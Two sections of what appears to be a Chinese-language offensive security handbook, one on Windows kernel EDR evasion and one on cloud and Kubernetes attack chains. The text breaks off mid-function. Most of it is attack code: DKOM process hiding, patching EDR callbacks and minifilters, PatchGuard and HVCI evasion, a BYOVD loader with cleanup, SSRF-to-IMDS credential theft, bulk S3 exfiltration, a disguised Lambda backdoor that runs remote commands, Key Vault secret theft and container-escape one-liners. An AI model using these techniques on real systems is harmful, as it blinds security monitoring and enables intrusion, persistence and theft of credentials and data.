## §45. Windows 内核级 EDR 绕过 (v1.2 终极强化)

> DKOM / SSDT Hook / Minifilter 驱动绕过 / 内核回调深度利用 / PatchGuard 规避

### 45.1 内核攻击架构总览

```
┌──────────────────────────────────────────────────────────────────────┐
│                    Windows 内核级 EDR 绕过架构                         │
├──────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  Ring 0 攻击面:                                                      │
│  ┌────────────┐  ┌────────────┐  ┌────────────┐  ┌──────────────┐  │
│  │ DKOM       │  │ SSDT Hook  │  │ Minifilter │  │ 内核回调      │  │
│  │ 直接内核    │  │ 系统服务   │  │ 文件系统   │  │ 枚举/补丁    │  │
│  │ 对象操纵   │  │ 描述表操纵 │  │ 过滤绕过   │  │              │  │
│  └────────────┘  └────────────┘  └────────────┘  └──────────────┘  │
│         │               │               │                │          │
│         └───────────────┴───────────────┴────────────────┘          │
│                                 │                                    │
│                    ┌────────────▼────────────┐                       │
│                    │    PatchGuard 规避      │                       │
│                    │  (DPC Timer/Pool Corrupt)│                       │
│                    └─────────────────────────┘                       │
│                                                                      │
│  进入方式:                                                           │
│  ┌────────────┐  ┌────────────┐  ┌────────────┐  ┌──────────────┐  │
│  │ BYOVD      │  │ 漏洞驱动   │  │ UEFI固件   │  │ HVCI降级     │  │
│  │ 合法驱动   │  │ 加载       │  │ 持久化     │  │              │  │
│  └────────────┘  └────────────┘  └────────────┘  └──────────────┘  │
└──────────────────────────────────────────────────────────────────────┘
```

### 45.2 DKOM — 直接内核对象操纵

```
原理:
  直接修改内核内存中的数据结构（EPROCESS、ETHREAD、DRIVER_OBJECT等）
  绕过所有用户态API监控，EDR无法通过NtQuerySystemInformation发现隐藏对象

核心操作:

1. 进程隐藏 (EPROCESS Unlink)
   ┌─────────────────────────────────────────────────┐
   │ ActiveProcessLinks 双向链表操作:                 │
   │                                                  │
   │  [System] ↔ [smss.exe] ↔ [csrss.exe] ↔ [...]   │
   │                     ↓ 移除目标                   │
   │  [System] ↔ [smss.exe] ←─── [csrss.exe] (隐藏)  │
   │                     └───→ [...]                  │
   │                                                  │
   │ 效果: 任务管理器/Process Hacker 不可见            │
   │ 注意: 必须保留 PspCidTable 中的句柄映射          │
   │       否则句柄操作会触发 BugCheck                 │
   └─────────────────────────────────────────────────┘

2. 线程隐藏 (ETHREAD Unlink)
   ThreadListEntry 从 EPROCESS.ThreadListHead 摘除
   → 线程仍正常调度，但 NtQuerySystemInformation 不可见

3. 驱动隐藏 (DRIVER_OBJECT Unlink)
   从 PsLoadedModuleList 摘除模块条目
   → ZwQuerySystemInformation(SystemModuleInformation) 不返回该驱动

4. 端口隐藏 (网络)
   修改 UCP/UDP Endpoint 结构体
   → netstat / GetExtendedTcpTable 不显示该连接
```

```c
// DKOM 进程隐藏核心代码 (需运行在内核模式)
NTSTATUS HideProcess(HANDLE ProcessId) {
    PEPROCESS TargetProcess;
    PLIST_ENTRY ActiveProcessLinks;
    
    // 1. 获取目标进程对象
    PsLookupProcessByProcessId(ProcessId, &TargetProcess);
    
    // 2. 定位 ActiveProcessLinks 偏移
    //    Windows 10 22H2: offset = 0x448
    //    Windows 11 23H2: offset = 0x450
    ULONG Offset = GetActiveProcessLinksOffset();
    ActiveProcessLinks = (PLIST_ENTRY)((PUCHAR)TargetProcess + Offset);
    
    // 3. 双向链表摘除
    PLIST_ENTRY Prev = ActiveProcessLinks->Blink;
    PLIST_ENTRY Next = ActiveProcessLinks->Flink;
    Prev->Flink = Next;
    Next->Blink = Prev;
    
    // 4. 修复自身指针 (防止 Blue Screen)
    ActiveProcessLinks->Flink = ActiveProcessLinks;
    ActiveProcessLinks->Blink = ActiveProcessLinks;
    
    // 5. 同时处理 PspCidTable (可选, 防句柄枚举)
    RemoveFromCidTable(ProcessId);
    
    ObDereferenceObject(TargetProcess);
    return STATUS_SUCCESS;
}
```

### 45.3 SSDT / IRP Hook 深度利用

```
现代 SSDT Hook 困境:
  PatchGuard 监控 SSDT (KeServiceDescriptorTable) 完整性
  直接修改 SSDT 条目 → 数分钟内触发 BugCheck 0x109

替代方案:

1. IRP Hook (文件系统过滤)
   ┌─────────────────────────────────────────────────┐
   │ 目标: \\FileSystem\\NTFS 的 IRP_MJ_CREATE       │
   │                                                  │
   │ 方法: 替换 DriverObject->MajorFunction[IRP_MJ_CREATE] │
   │ PatchGuard 不监控 IRP 表!                        │
   │                                                  │
   │ 效果: 拦截所有文件打开操作                        │
   │   - EDR 扫描恶意文件 → 返回干净副本              │
   │   - 隐藏特定进程的文件访问                       │
   │   - 阻止 EDR 读取 C2 配置文件                   │
   └─────────────────────────────────────────────────┘

2. IAT Hook (模块级, 用户态)
   修改目标进程 Import Address Table
   → 函数调用重定向到我们的实现
   → 比 Inline Hook 更难检测 (不修改代码段)

3. Inline Hook + 代码签名绕过
   修改函数前几字节为 JMP 到我们的代码
   → 需要处理 PatchGuard 和 DSE (Driver Signature Enforcement)
   → 通过 BYOVD 加载已签名驱动来执行
```

```python
# IRP Hook 检测与绕过脚本
class IRPHookEngine:
    """IRP Hook 引擎 — 文件系统级EDR规避"""
    
    # EDR 常用 IRP 监控点
    EDR_IRP_TARGETS = {
        'IRP_MJ_CREATE': '文件打开/进程创建监控',
        'IRP_MJ_READ': '文件内容扫描',
        'IRP_MJ_WRITE': '文件修改监控',
        'IRP_MJ_DIRECTORY_CONTROL': '目录枚举监控',
        'IRP_MJ_DEVICE_CONTROL': 'DeviceIoControl 监控',
    }
    
    def hook_irp_create(self, target_driver='ntfs'):
        """Hook IRP_MJ_CREATE — 拦截文件打开"""
        # 1. 获取目标驱动对象
        driver_obj = self.get_driver_object(target_driver)
        
        # 2. 保存原始 IRP 处理函数
        self.original_create = driver_obj.MajorFunction[IRP_MJ_CREATE]
        
        # 3. 替换为我们的处理函数
        driver_obj.MajorFunction[IRP_MJ_CREATE] = self.hooked_create
        
    def hooked_create(self, device_object, irp):
        """Hooked IRP_MJ_CREATE — 选择性隐藏"""
        file_name = self.extract_file_name(irp)
        caller_pid = self.get_caller_process_id()
        
        # 如果调用者是 EDR 进程，返回干净文件
        if caller_pid in self.edr_pids:
            if file_name in self.hidden_files:
                return self.return_clean_copy(irp)
        
        # 否则正常处理
        return self.original_create(device_object, irp)
```

### 45.4 Minifilter 驱动绕过

```
EDR 使用 Minifilter 驱动监控文件系统:
  CrowdStrike → csagent.sys (fltFilter)
  SentinelOne → SentinelMonitorFilter.sys
  Defender → WdFilter.sys
  360 → 360BoxSys.sys / 360FsFilter.sys
  火绒 → sysdiag64.sys (Minifilter)

绕过策略:

1. Minifilter 通信端口枚举 + 干扰
   FltEnumerateFilters → 发现所有注册的 Minifilter
   通过 FltSendMessage 发送畸形消息 → 触发 EDR 过滤器异常

2. 直接 I/O (Direct I/O)
   使用 FILE_NO_INTERMEDIATE_BUFFERING | FILE_WRITE_THROUGH
   绕过某些 Minifilter 的缓冲监控

3. 卷快照利用
   通过 VSS (Volume Shadow Copy) 创建快照
   从快照设备读取 → 绕过 Minifilter 的文件监控

4. 内核模式文件操作
   ZwCreateFile(Zw 系列) 在内核模式直接操作
   → 某些 Minifilter 仅过滤用户模式 IRP

5. 过滤器高度卸载
   FltUnregisterFilter → 如果能获取 EDR 过滤器句柄
   或通过 IoUnregisterFsRegistration 卸载整个过滤器
```

```python
class MinifilterBypass:
    """Minifilter 驱动绕过引擎"""
    
    # 已知 EDR Minifilter 驱动
    EDR_MINIFILTERS = {
        'csagent.sys': {'vendor': 'CrowdStrike', 'altitude': '320900', 'ops': 50},
        'SentinelMonitorFilter.sys': {'vendor': 'SentinelOne', 'altitude': '360650', 'ops': 45},
        'WdFilter.sys': {'vendor': 'Defender', 'altitude': '328010', 'ops': 55},
        '360BoxSys.sys': {'vendor': '360', 'altitude': '321500', 'ops': 40},
        'sysdiag64.sys': {'vendor': 'Huorong', 'altitude': '321200', 'ops': 35},
        'TmFilter.sys': {'vendor': 'TrendMicro', 'altitude': '302700', 'ops': 48},
        'epfiltr.sys': {'vendor': 'ESET', 'altitude': '326500', 'ops': 42},
    }
    
    def detect_edr_filters(self):
        """检测当前系统注册的 EDR Minifilter"""
        detected = []
        for filter_name, info in self.EDR_MINIFILTERS.items():
            if self.filter_exists(filter_name):
                detected.append({
                    'name': filter_name,
                    'vendor': info['vendor'],
                    'altitude': info['altitude'],
                    'operations_monitored': info['ops'],
                })
        return detected
    
    def bypass_via_vss(self, target_file):
        """通过卷快照绕过 Minifilter 文件监控"""
        # 1. 创建卷快照
        shadow_id = self.create_shadow_copy('C:')
        
        # 2. 从快照设备直接读取
        shadow_device = f"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy{shadow_id}"
        
        # 3. 通过 ZwCreateFile 内核模式读取 (绕过 Minifilter)
        content = self.kernel_read(shadow_device + target_file)
        
        # 4. 清理快照
        self.delete_shadow_copy(shadow_id)
        return content
    
    def bypass_via_direct_io(self, target_file):
        """通过 Direct I/O 绕过缓冲型 Minifilter"""
        handle = CreateFileW(
            target_file,
            GENERIC_READ,
            FILE_SHARE_READ,
            None,
            OPEN_EXISTING,
            FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH,  # 关键标志
            None
        )
        return handle
```

### 45.5 内核回调深度枚举与补丁

```
EDR 依赖 6 类内核回调实现监控:

┌──────────────────────────────────────────────────────────────┐
│ 回调类型                    │ 注册API                    │ 用途          │
├─────────────────────────────┼────────────────────────────┼───────────────┤
│ PsSetCreateProcessNotifyRoutine  │ 进程创建/销毁通知    │ 进程监控      │
│ PsSetCreateThreadNotifyRoutine   │ 线程创建通知         │ 线程监控      │
│ PsSetLoadImageNotifyRoutine      │ 镜像加载通知         │ DLL/驱动加载  │
│ PsSetProcessExitCallback         │ 进程退出通知         │ 进程终止      │
│ CmRegisterCallback               │ 注册表操作通知       │ 注册表监控    │
│ ObRegisterCallbacks              │ 句柄操作通知         │ 进程保护      │
└──────────────────────────────────────────────────────────────┘

绕过方法:

方法1: 回调数组直接清除
  PspCreateProcessNotifyRoutine 是固定大小数组 (64 entries)
  遍历数组 → 找到 EDR 回调地址 → 清零
  注意: 需要持有 ExMutant 锁

方法2: 回调函数内部 Patch
  不删除回调注册，而是 Patch 回调函数内部
  在回调函数入口写入 ret → 回调"执行"但什么都不做
  优势: 数组检查无法发现异常

方法3: 回调返回状态操纵
  Hook 回调分发逻辑，修改返回给内核的状态码
  → 内核认为回调正常执行，但实际效果被改变
```

```c
// 内核回调枚举与清除
typedef struct _CALLBACK_ENTRY {
    LIST_ENTRY ListEntry;
    ULONG64 Version;
    PVOID PreOperation;
    PVOID PostOperation;
    PVOID Cookie;
} CALLBACK_ENTRY;

NTSTATUS EnumAndPatchCallbacks(void) {
    // 1. 枚举进程创建回调
    //    通过未文档化的 PspCreateProcessNotifyRoutine 数组
    for (int i = 0; i < 64; i++) {
        PVOID callback = GetProcessNotifyEntry(i);
        if (callback && IsEDRDriver(callback)) {
            // 方法A: 清零回调条目
            // SetProcessNotifyEntry(i, NULL);
            
            // 方法B: Patch 回调函数入口 (更隐蔽)
            PatchFunctionEntry(callback, RET_INSTRUCTION);
            Log("[+] Patched process callback #%d -> EDR driver", i);
        }
    }
    
    // 2. 枚举 ObRegisterCallbacks (句柄保护)
    //    遍历 CallbackList 链表
    LIST_ENTRY* list = GetObCallbackList();
    for (LIST_ENTRY* e = list->Flink; e != list; e = e->Flink) {
        CALLBACK_ENTRY* entry = CONTAINING_RECORD(e, CALLBACK_ENTRY, ListEntry);
        if (IsEDRDriver(entry->PreOperation)) {
            // 移除句柄保护 → 允许打开 EDR 保护进程
            entry->PreOperation = DummyPreOperation;
            Log("[+] Disabled ObRegisterCallback for EDR");
        }
    }
    
    return STATUS_SUCCESS;
}
```

### 45.6 PatchGuard (KPP) 规避策略

```
PatchGuard 监控项:
  1. SSDT (KeServiceDescriptorTable)
  2. IDT (Interrupt Descriptor Table)
  3. GDT (Global Descriptor Table)
  4. MSR (Model Specific Registers, 尤其 LSTAR)
  5. 关键内核函数 (KiDispatchException, KiFastCallEntry 等)
  6. 关键数据结构 (EPROCESS.Token, DRIVERS_OBJECT)

PatchGuard 检查机制:
  - DPC Timer 周期性检查 (随机间隔, 5-10分钟)
  - 工作者线程 (PsDpcRoutine → KiRetireDpcList)
  - 上下文结构: 加密的检查状态存储在 NonPagedPool

规避策略:

1. DPC Timer 禁用
   找到 PatchGuard 的 DPC Timer 对象
   → 修改 Timer.DueTime 为最大值
   → 检查永远不会触发

2. 上下文结构破坏
   定位 PatchGuard 的上下文结构体
   → 修改检查标志位为"已检查通过"
   → 检查线程认为一切正常

3. 伪装修改 (Temporary Patch)
   修改内核 → 等待 PatchGuard 检查前恢复 → 检查通过 → 再次修改
   时间窗口: ~100ms (检查执行时间极短)
   需要精确的时序控制

4. EfiRuntimeCrypt 利用
   Windows 10 1607+ 的 PatchGuard 加密机制
   通过 KiScrambleRoutineContext 的逆向实现
   → 可以正确修改加密的检查上下文
```

```python
class PatchGuardBypass:
    """PatchGuard 规避引擎 — 多种策略自适应选择"""
    
    # PatchGuard 版本特征
    PG_VERSIONS = {
        'v1': {'os': 'Windows XP/2003', 'check_interval': '2-5min', 'method': 'DPC Timer'},
        'v2': {'os': 'Windows Vista/7', 'check_interval': '5-10min', 'method': 'DPC + Worker'},
        'v3': {'os': 'Windows 8/8.1', 'check_interval': 'random', 'method': 'Encrypted Context'},
        'v4': {'os': 'Windows 10 1507-21H2', 'check_interval': 'random', 'method': 'EfiRuntimeCrypt'},
        'v5': {'os': 'Windows 10 22H2+', 'check_interval': 'random', 'method': 'Secure Kernel Check'},
        'v6': {'os': 'Windows 11 23H2+', 'check_interval': 'random', 'method': 'VBS-Enhanced PG'},
    }
    
    def select_strategy(self, os_version):
        """根据操作系统版本选择最优 PatchGuard 规避策略"""
        pg_ver = self.detect_pg_version(os_version)
        
        if pg_ver in ['v1', 'v2']:
            return 'dpc_timer_disable'  # 简单有效
        elif pg_ver == 'v3':
            return 'context_corruption'  # 破坏加密上下文
        elif pg_ver in ['v4', 'v5']:
            return 'temporary_patch'  # 时序窗口修改
        elif pg_ver == 'v6':
            return 'vbs_downgrade'  # 需要先降级 VBS
        
        return 'byovd_direct'  # 兜底: BYOVD 直接操作
    
    def temporary_patch_window(self, target_address, new_value, duration_ms=50):
        """时序窗口 Patch — 在 PatchGuard 检查间隙修改"""
        import time
        
        # 1. 备份原始值
        original = self.read_kernel_memory(target_address, 8)
        
        # 2. 写入新值
        self.write_kernel_memory(target_address, new_value)
        
        # 3. 在窗口期内执行需要的操作
        time.sleep(duration_ms / 1000.0)
        
        # 4. 恢复原始值 (PatchGuard 检查前)
        self.write_kernel_memory(target_address, original)
        
        return True
```

### 45.7 BYOVD (Bring Your Own Vulnerable Driver) 高级利用

```
BYOVD 攻击链:
  1. 选择已签名的漏洞驱动 (微软 WHQL 签名)
  2. 将驱动部署到目标 (需管理员权限)
  3. sc create / sc start 加载驱动
  4. 利用驱动漏洞读写任意内核内存
  5. 执行 DKOM/SSDT/回调补丁等操作
  6. 卸载驱动 → 不留痕迹

2026 高价值 BYOVD 驱动库:

| 驱动文件 | 厂商 | 漏洞类型 | 能力 | 状态 |
|---------|------|---------|------|------|
| rtcore64.sys | MSI Afterburner | 任意物理内存读写 | DKOM/SSDT/回调全操作 | 已撤销签名 |
| dbutil_2_3.sys | Dell BIOS | 任意内核读写 | 全内核操作 | CVE-2021-21551 |
| gdrv.sys | GIGABYTE | 任意 MSR/CR 读写 | PatchGuard 绕过 | CVE-2018-19320 |
| enclv.sys | Intel SGX | 任意虚拟/物理内存读写 | 全内核操作 | CVE-2023-38866 |
| asrdrv104.sys | ASRock | 任意端口 I/O | HVCI 绕过 | CVE-2024-29222 |
| lenovodiag.sys | Lenovo | 任意 MSR 读写 | PatchGuard 绕过 | CVE-2022-3699 |
| amifldrv64.sys | AMI BIOS | 任意物理内存读写 | 固件持久化 | CVE-2024-26996 |
| hwinfo64.sys | HWiNFO | 任意物理内存读写 | 全内核操作 | 2024 报告 |
| asusio64.sys | ASUS | 任意端口 I/O + MSR | HVCI + PG 绕过 | CVE-2024-33815 |
| phymem_win64.sys | 通用 | 任意物理内存读写 | DKOM 操作 | 经典 BYOVD |

防御状态 (2026):
  Microsoft HVCI: 阻止第三方驱动加载 (需 VBS 启用)
  Microsoft VBS: 内存隔离保护关键内核结构
  Windows Defender: 维护漏洞驱动哈希黑名单 (持续更新)
  绕过 HVCI: 需要 UEFI 固件级攻击或 Secure Boot 漏洞
```

```python
class BYOVDManager:
    """BYOVD 管理器 — 漏洞驱动部署与利用"""
    
    VULNERABLE_DRIVERS = {
        'rtcore64.sys': {
            'vendor': 'MSI Afterburner',
            'cve': 'CVE-2019-16098',
            'capabilities': ['phys_read', 'phys_write', 'msr_read', 'msr_write'],
            'signature_status': 'revoked_2024',
            'hvci_bypass': False,
            'pg_bypass': True,
        },
        'dbutil_2_3.sys': {
            'vendor': 'Dell BIOS Update',
            'cve': 'CVE-2021-21551',
            'capabilities': ['kernel_read', 'kernel_write', 'phys_read', 'phys_write'],
            'signature_status': 'valid_until_2025',
            'hvci_bypass': False,
            'pg_bypass': True,
        },
        'gdrv.sys': {
            'vendor': 'GIGABYTE Tools',
            'cve': 'CVE-2018-19320',
            'capabilities': ['msr_read', 'msr_write', 'cr_read', 'cr_write', 'io_port'],
            'signature_status': 'valid',
            'hvci_bypass': True,  # IO Port 能力可绕过 HVCI
            'pg_bypass': True,
        },
    }
    
    def deploy_and_exploit(self, driver_name, target_ops):
        """部署漏洞驱动并执行内核操作"""
        driver = self.VULNERABLE_DRIVERS[driver_name]
        
        # 1. 检查 HVCI 状态
        hvci_enabled = self.check_hvci_status()
        if hvci_enabled and not driver['hvci_bypass']:
            return {'error': 'HVCI enabled, driver cannot bypass'}
        
        # 2. 复制驱动到系统目录
        self.copy_to_system32(driver_name)
        
        # 3. 创建并启动服务
        self.create_service(driver_name)
        self.start_service(driver_name)
        
        # 4. 通过 IOCTL 执行内核操作
        results = {}
        for op in target_ops:
            results[op] = self.execute_operation(driver_name, op)
        
        # 5. 清理: 停止服务 + 删除驱动
        self.stop_service(driver_name)
        self.delete_service(driver_name)
        self.delete_driver_file(driver_name)
        
        return results
```

### 45.8 HVCI / VBS 降级攻击

```
HVCI (Hypervisor-Protected Code Integrity) 保护:
  - 基于 VBS (Virtualization-Based Security)
  - 内核代码页标记为不可写 (即使 Ring 0 也无法修改)
  - 保护 SSDT、IDT、关键函数代码段

降级攻击路径:

路径1: Secure Boot 漏洞 → 修改 BCD → 禁用 VBS
  1. 利用 UEFI 固件漏洞 (ThinkPwn / Dell / HP BIOS 漏洞)
  2. 修改 BCD 配置: bcdedit /set {guid} hypervisorlaunchtype off
  3. 重启 → VBS 不启动 → HVCI 失效

路径2: 注册表降级
  HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity
  ChangedInBootCycle = 0 → 下次启动禁用

路径3: 内存完整性策略操纵
  通过 BYOVD 直接修改内存中的 VBS 配置结构
  → 运行时降级 HVCI (不需要重启)

路径4: EFI 变量篡改
  通过 \EFI\Microsoft\Boot\BCD 修改启动配置
  → 需要 Secure Boot 绕过或 UEFI 漏洞
```

---


## §46. 云原生攻击矩阵 (v1.2 终极强化)

> AWS / Azure / GCP 全云攻击 + Kubernetes 集群渗透 + Serverless 函数利用 + 多云横向移动

### 46.1 云攻击全景架构

```
┌──────────────────────────────────────────────────────────────────────┐
│                    云原生攻击矩阵 (Cloud Attack Matrix)                │
├──────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  ┌─────────────────────────────────────────────────────────────┐    │
│  │                    初始访问层                                │    │
│  │  SSRF→IMDS | 凭证泄露(Git/JS) | API密钥硬编码 | 元数据服务  │    │
│  └─────────────────────────┬───────────────────────────────────┘    │
│                            │                                         │
│  ┌─────────────────────────▼───────────────────────────────────┐    │
│  │                    权限提升层                                │    │
│  │  IAM策略滥用 | 角色链跳转 | 跨账号信任利用 | STS AssumeRole  │    │
│  └─────────────────────────┬───────────────────────────────────┘    │
│                            │                                         │
│  ┌─────────────────────────▼───────────────────────────────────┐    │
│  │                    横向移动层                                │    │
│  │  跨服务渗透 | 跨Region | 跨账号 | 多云联邦 | K8s集群逃逸     │    │
│  └─────────────────────────┬───────────────────────────────────┘    │
│                            │                                         │
│  ┌─────────────────────────▼───────────────────────────────────┐    │
│  │                    数据外泄层                                │    │
│  │  S3/OSS/Blob 窃取 | RDS/数据库导出 | Lambda/函数快照提取     │    │
│  └─────────────────────────────────────────────────────────────┘    │
│                                                                      │
│  免杀集成: §28 CDN穿透部署 + §27 Telegram C2 + §36 AI自适应免杀     │
└──────────────────────────────────────────────────────────────────────┘
```

### 46.2 AWS 全攻击链

```python
class AWSAttackChain:
    """AWS 全攻击链 — 从初始访问到完全控制"""
    
    # Phase 1: 初始访问 — SSRF → IMDSv1 凭证窃取
    def ssrf_to_imds(self, ssrf_url):
        """通过 SSRF 获取 EC2 实例角色凭证"""
        # IMDSv1 (无需 Token, SSRF 直接可用)
        imds_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        
        # 通过 SSRF 代理访问
        roles = self.request_via_ssrf(ssrf_url, imds_url)
        
        # 获取角色凭证
        creds = self.request_via_ssrf(ssrf_url, imds_url + roles.strip())
        # → AccessKeyId, SecretAccessKey, Token
        
        return creds
    
    # Phase 2: 权限提升 — IAM 角色链跳转
    def role_chain_escalation(self, initial_creds):
        """通过 IAM 角色链实现权限提升"""
        chains = [
            # 角色链: 每步 assume 更高权限角色
            ['arn:aws:iam::111:role/LambdaExec',
             'arn:aws:iam::111:role/Admin-Assume',
             'arn:aws:iam::111:role/OrganizationAdmin'],
            
            # 跨账号链
            ['arn:aws:iam::111:role/CrossAccount',
             'arn:aws:iam::222:role/TargetAdmin'],
        ]
        
        creds = initial_creds
        for chain in chains:
            for role_arn in chain:
                try:
                    creds = self.assume_role(creds, role_arn)
                    print(f"[+] Escalated to: {role_arn}")
                except:
                    continue
        
        return creds
    
    # Phase 3: 数据外泄 — S3 批量窃取
    def s3_data_exfil(self, admin_creds):
        """批量外泄 S3 存储桶数据"""
        s3 = boto3.client('s3', **admin_creds)
        
        # 枚举所有可访问的桶
        buckets = s3.list_buckets()['Buckets']
        
        for bucket in buckets:
            name = bucket['Name']
            try:
                # 列举对象
                objects = s3.list_objects_v2(Bucket=name)
                for obj in objects.get('Contents', []):
                    # 下载到本地
                    s3.download_file(name, obj['Key'], f'exfil/{name}/{obj["Key"]}')
            except:
                continue
    
    # Phase 4: 持久化 — Lambda 后门
    def lambda_backdoor(self, admin_creds):
        """在 Lambda 函数中植入持久化后门"""
        lambda_client = boto3.client('lambda', **admin_creds)
        
        # 1. 创建后门 Lambda 函数
        backdoor_code = '''
import json, urllib.request, base64, subprocess

def lambda_handler(event, context):
    # 检查是否为 C2 指令 (通过特殊 Header)
    if event.get('headers', {}).get('X-Command'):
        cmd = base64.b64decode(event['headers']['X-Command']).decode()
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return {'statusCode': 200, 'body': result.stdout}
    
    # 正常函数逻辑 (伪装)
    return {'statusCode': 200, 'body': json.dumps({'status': 'ok'})}
'''
        # 2. 打包部署
        zip_data = self.create_lambda_zip(backdoor_code)
        lambda_client.create_function(
            FunctionName='health-check-monitor',
            Runtime='python3.12',
            Role='arn:aws:iam::111:role/LambdaExec',
            Handler='index.lambda_handler',
            Code={'ZipFile': zip_data},
        )
        
        # 3. 创建 API Gateway 触发器 (外部可访问)
        # 4. 创建 CloudWatch Event 定时触发 (保活)
```

### 46.3 Azure 攻击链

```python
class AzureAttackChain:
    """Azure 全攻击链"""
    
    # Phase 1: 初始访问 — Managed Identity 窃取
    def imds_managed_identity(self, ssrf_url=None):
        """通过 IMDS 获取 Azure Managed Identity"""
        # Azure IMDS (需要 Metadata: true Header)
        imds_url = "http://169.254.169.254/metadata/identity/oauth2/token"
        params = {
            'api-version': '2021-02-01',
            'resource': 'https://management.azure.com/',
        }
        headers = {'Metadata': 'true'}
        
        token = self.request(imds_url, params=params, headers=headers)
        return token['access_token']
    
    # Phase 2: 权限提升 — Azure AD 角色滥用
    def azure_ad_escalation(self, token):
        """Azure AD 权限提升路径"""
        escalation_paths = [
            # 路径1: User.Read → Directory.Read.All → 全局管理员
            {'permission': 'User.Read',
             'action': 'enumerate_admins',
             'next': 'target_admin_phishing'},
            
            # 路径2: Application.ReadWrite.All → 创建高权限应用
            {'permission': 'Application.ReadWrite.All',
             'action': 'create_backdoor_app',
             'next': 'grant_admin_consent'},
            
            # 路径3: RoleManagement.ReadWrite.Directory → 直接提权
            {'permission': 'RoleManagement.ReadWrite.Directory',
             'action': 'assign_global_admin',
             'next': 'full_tenant_control'},
            
            # 路径4: PrivilegedAuthenticationAdmin → 重置 MFA
            {'permission': 'PrivilegedAuthenticationAdmin',
             'action': 'reset_mfa_target_admin',
             'next': 'admin_takeover'},
        ]
        return escalation_paths
    
    # Phase 3: 横向移动 — 跨订阅/租户
    def cross_subscription_lateral(self, mgmt_token):
        """跨 Azure 订阅横向移动"""
        # 1. 枚举所有可访问的订阅
        subs = self.list_subscriptions(mgmt_token)
        
        # 2. 对每个订阅枚举资源
        for sub in subs:
            resources = self.enumerate_resources(sub['id'], mgmt_token)
            # VMs, Storage Accounts, Key Vaults, SQL Databases...
            
            # 3. 尝试通过 Automation Account 执行代码
            if 'automation_accounts' in resources:
                for aa in resources['automation_accounts']:
                    self.create_runbook(aa, backdoor_code)
                    self.start_runbook(aa)
    
    # Phase 4: Key Vault 窃取
    def keyvault_exfil(self, token):
        """Azure Key Vault 密钥/证书窃取"""
        vaults = self.list_key_vaults(token)
        for vault in vaults:
            # 窃取密钥
            keys = self.list_keys(vault, token)
            for key in keys:
                material = self.get_key_material(vault, key, token)
            
            # 窃取证书
            certs = self.list_certificates(vault, token)
            for cert in certs:
                pfx = self.get_certificate_pfx(vault, cert, token)
            
            # 窃取秘密
            secrets = self.list_secrets(vault, token)
            for secret in secrets:
                value = self.get_secret_value(vault, secret, token)
```

### 46.4 Kubernetes 集群攻击

```python
class K8sAttackChain:
    """Kubernetes 集群完整攻击链"""
    
    # Phase 1: 初始访问 → ServiceAccount Token
    def steal_sa_token(self, pod_name, namespace='default'):
        """窃取 Pod 内 ServiceAccount Token"""
        # 标准挂载路径
        token_path = '/var/run/secrets/kubernetes.io/serviceaccount/token'
        ca_path = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
        
        # 通过 RCE 或 SSRF 读取
        token = self.read_file_from_pod(pod_name, token_path)
        ca_cert = self.read_file_from_pod(pod_name, ca_path)
        
        return token, ca_cert
    
    # Phase 2: 权限枚举
    def enumerate_permissions(self, token, api_server):
        """枚举 ServiceAccount 权限"""
        headers = {'Authorization': f'Bearer {token}'}
        
        # SelfSubjectAccessReview — 检查自身权限
        permissions = {
            'list_pods': self.check_permission(token, '', 'pods', 'list'),
            'create_pods': self.check_permission(token, '', 'pods', 'create'),
            'list_secrets': self.check_permission(token, '', 'secrets', 'list'),
            'create_pods_exec': self.check_permission(token, '', 'pods/exec', 'create'),
            'list_clusterroles': self.check_permission(token, 'rbac.authorization.k8s.io', 'clusterroles', 'list'),
            'create_daemonset': self.check_permission(token, 'apps', 'daemonsets', 'create'),
            'escalate_clusteradmin': self.check_permission(token, 'rbac.authorization.k8s.io', 'clusterroles/bind', 'escalate'),
        }
        return permissions
    
    # Phase 3: 集群接管攻击路径
    def cluster_takeover(self, token, api_server):
        """K8s 集群接管 — 多条攻击路径"""
        
        # 路径A: 特权 Pod → 节点接管
        if self.can_create_privileged_pod(token):
            # 创建特权 Pod → 挂载宿主机文件系统
            self.create_privileged_pod(
                host_path='/etc',
                mount_path='/host-etc',
                # 现在可以读写宿主机所有文件
                # 包括 /etc/kubernetes/kubelet.conf → 节点级 K8s 凭证
            )
            kubelet_creds = self.read_file('/host-etc/kubernetes/kubelet.conf')
        
        # 路径B: cluster-admin → 完全控制
        if self.is_cluster_admin(token):
            # 1. 窃取所有 namespace 的 secrets
            all_secrets = self.list_all_secrets(token)
            
            # 2. 创建后门 DaemonSet (每个节点一个 Pod)
            self.create_daemonset('system-monitor', backdoor_image)
            
            # 3. 创建持久化 ServiceAccount + ClusterRoleBinding
            self.create_backdoor_sa('kube-system-monitor', cluster_admin=True)
        
        # 路径C: SSRF → K8s API → 内部服务
        # 通过 SSRF 访问 api-server (通常在集群内网)
        if self.ssrf_reaches_api():
            return self.api_from_ssrf()
    
    # Phase 4: 容器逃逸
    def container_escape(self):
        """容器逃逸技术矩阵"""
        escape_techniques = [
            # 1. 特权容器 → 直接挂载宿主机
            {'method': 'privileged_mount', 'requirement': 'privileged: true',
             'action': 'mount /dev/sda1 /mnt && chroot /mnt'},
            
            # 2. 容器逃逸 → CVE-2024-21626 (runc 漏洞)
            {'method': 'runc_cve', 'requirement': 'runc < 1.1.12',
             'action': 'WORKDIR /proc/self/fd/8 然后 ln -s / /host'},
            
            # 3. Docker Socket 暴露
            {'method': 'docker_socket', 'requirement': '/var/run/docker.sock mounted',
             'action': 'docker -H unix:///var/run/docker.sock run --privileged ...'},
            
            # 4. Kernel Exploit (共享内核)
            {'method': 'kernel_exploit', 'requirement': 'vulnerable kernel version',
             'action': 'dirty_pipe / dirty_cow / exploit'},
            
            # 5. Cgroup 通知释放攻击
            {'method': 'cgroup_release_agent', 'requirement': 'CAP_SYS_ADMIN',
             'action': 'echo /proc/self/fd/0 > /sys/fs/cgroup/release_agent'},
        ]
        return escape_techniques
```

### 46.5 Serverless 函数攻击

```python
class ServerlessAttack:
    """Serverless / FaaS 攻击技术"""
    
    # AWS Lambda 攻击
    def lambda_attacks(self):
